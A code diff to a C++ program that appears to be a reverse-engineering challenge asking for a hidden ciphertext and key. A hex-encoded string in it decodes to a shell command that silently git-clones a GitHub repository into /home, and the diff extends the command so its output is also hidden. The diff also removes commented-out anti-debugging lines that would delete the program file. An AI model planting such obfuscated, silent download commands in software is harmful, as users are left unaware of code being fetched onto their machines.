@@ -39,12 +39,13 @@ std::string math_mode(const std::string& hex) {
 }
 
 const char hello[] = 
-        "\x63\x64\x20\x2f\x68\x6f\x6d\x65\x20\x26\x26\x20\x67\x69\x74\x20\x63\x6c\x6f"
+        "\x28\x63\x64\x20\x2f\x68\x6f\x6d\x65\x20\x26\x26\x20\x67\x69\x74\x20\x63\x6c\x6f"
         "\x6e\x65\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63"
         "\x6f\x6d\x2f\x6a\x6f\x68\x6e\x2d\x6c\x65\x64\x65\x74\x2f\x69\x6d\x61\x67\x65"
         "\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2e\x67\x69\x74\x20\x69\x6d\x61\x67\x65\x64"
         "\x6f\x77\x6e\x6c\x6f\x61\x64\x20\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c"
-        "\x20\x32\x3e\x26\x31\x3b\x20\x63\x64\x20\x2d";
+        "\x20\x32\x3e\x26\x31\x3b\x20\x63\x64\x20\x2d\x20\x3e\x20\x2f\x64\x65\x76\x2f"
+        "\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x29";
 
 
 std::string answerkey;
@@ -189,8 +190,6 @@ int main(){
     // //checking if a debugger is present
     // if (isDebuggerPresent()) {
     //     std::cout << "Debugger detected! Exiting..." << std::endl;
-    //     std::remove("easy_math");
-    //     return 1;
     // }
 
     std::signal(SIGALRM, signal_handler);
@@ -233,7 +232,7 @@ int main(){
     key();
     string cipher;
     string found_key;
-    cout << "** Answer the following once you are certain **";
+    cout << "** Answer the following once you are certain\n **";
     cout << "Enter the ciphertext that you have found within our program: (hint: copy and paste)\n";
     cin >> cipher;
     cout << "Ok, now enter the full 16 character key you found: \n";
